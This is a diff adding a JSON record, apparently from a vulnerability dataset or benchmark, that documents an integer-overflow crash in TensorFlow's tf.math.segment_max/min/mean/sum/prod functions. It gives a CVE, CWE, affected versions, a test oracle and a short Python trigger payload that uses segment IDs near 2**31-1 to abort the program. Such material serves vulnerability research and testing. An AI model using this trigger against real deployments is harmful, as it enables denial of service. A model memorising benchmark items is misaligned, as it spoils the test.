@@ -1,0 +1,15 @@
+{
+  "file_id": "741_tensorflow_issue_51733",
+  "numeric_id": "741",
+  "library_hint": "tensorflow",
+  "source": "github_issue",
+  "title": "tf.math.segment_max/min/mean/sum/prod crashes when segment_ids is large due to integer overflow",
+  "cve": "CVE-2022-23562",
+  "cwe": "CWE-190: Integer Overflow or Wraparound",
+  "library": "tensorflow",
+  "affected_version": ">= 2.0, < 2.7",
+  "vulnerable_function": "tf.math.segment_max, tf.math.segment_min, tf.math.segment_mean, tf.math.segment_sum, tf.math.segment_prod",
+  "triggerability": "indirect",
+  "trigger_payload": "import tensorflow as tf\nx = tf.constant([1.0, 2.0, 3.0])\nsegment_ids = tf.constant([2**31 - 1, 2**31 - 1, 2**31 - 1])\nresult = tf.math.segment_max(x, segment_ids)",
+  "oracle": "the program crashes (aborts) due to integer overflow"
+}
